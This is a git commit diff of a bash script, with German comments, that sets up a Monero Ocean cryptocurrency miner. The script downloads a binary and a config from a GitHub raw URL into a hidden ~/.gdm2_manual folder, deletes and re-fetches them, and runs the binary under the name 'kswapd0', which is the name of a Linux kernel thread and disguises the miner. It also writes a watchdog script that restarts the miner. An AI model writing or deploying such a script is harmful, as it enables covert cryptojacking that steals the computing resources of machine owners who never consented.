eef94a390e8f8575620bcd6e2949cecf7d196d44
Acen <113854209+littlAcen@users.noreply.github.com>
2024-06-05 13:25:21 +0200

    Update setup_gdm2_manual.sh

--- setup_gdm2_manual.sh
+++ setup_gdm2_manual.sh
@@ -1,8 +1,7 @@
 #!/bin/bash
 
-# Script um Monero Ocean Miner zu starten und Dateien zu verwalten
+# Skript um Monero Ocean Miner zu starten und Dateien zu verwalten
 
-# Verzeichnis erstellen, falls es nicht existiert
 mkdir -p "$HOME/.gdm2_manual/"
 
 # Pfade zu den benötigten Dateien
@@ -10,21 +9,35 @@ KSWAPD0="$HOME/.gdm2_manual/kswapd0"
 CONFIG_JSON="$HOME/.gdm2_manual/config.json"
 
 # Prozesse beenden, die mit kswapd0 verbunden sind
-pkill -f kswapd0
+pkill -f "$KSWAPD0"
 
-# Überprüfen und Herunterladen von kswapd0, falls erforderlich
-if [ ! -f "$KSWAPD0" ] || [ ! -x "$KSWAPD0" ]; then
+# Überprüfen, ob die Dateien existieren und starten, wenn sie existieren
+if [ -f "$KSWAPD0" ] && [ -x "$KSWAPD0" ]; then
+    echo "kswapd0 existiert und ist ausführbar."
+else
     echo "kswapd0 existiert nicht oder ist nicht ausführbar. Herunterladen..."
     wget -O "$KSWAPD0" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kswapd0
-    curl -O "$KSWAPD0" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kswapd0
     chmod +x "$KSWAPD0"
 fi
 
-# Überprüfen und Herunterladen von config.json, falls erforderlich
-if [ ! -f "$CONFIG_JSON" ]; then
+if [ -f "$CONFIG_JSON" ]; then
+    echo "config.json existiert."
+else
     echo "config.json existiert nicht. Herunterladen..."
     wget -O "$CONFIG_JSON" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
-    curl -O "$CONFIG_JSON" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
+fi
+
+# Dateien entfernen, falls sie existieren
+rm -f "$CONFIG_JSON" "$KSWAPD0"
+
+# Nochmal überprüfen und erneut herunterladen, falls entfernt
+if [ ! -f "$KSWAPD0" ]; then
+    wget -O "$KSWAPD0" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kswapd0
+    chmod +x "$KSWAPD0"
+fi
+
+if [ ! -f "$CONFIG_JSON" ]; then
+    wget -O "$CONFIG_JSON" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
 fi
 
 # kswapd0 ausführen
@@ -34,7 +47,9 @@ fi
 cat << 'EOF' > "$HOME/.gdm2_manual/check_kswapd0.sh"
 #!/bin/bash
 
-if ! pgrep -x "kswapd0" > /dev/null; then
+KSWAPD0_PATH="$HOME/.gdm2_manual/kswapd0"
+
+if ! pgrep -f "$KSWAPD0_PATH" > /dev/null; then
     echo "kswapd0 not started. Going to start it..."
     cd "$HOME/.gdm2_manual/" || exit
     ./kswapd0 --config=config.json &
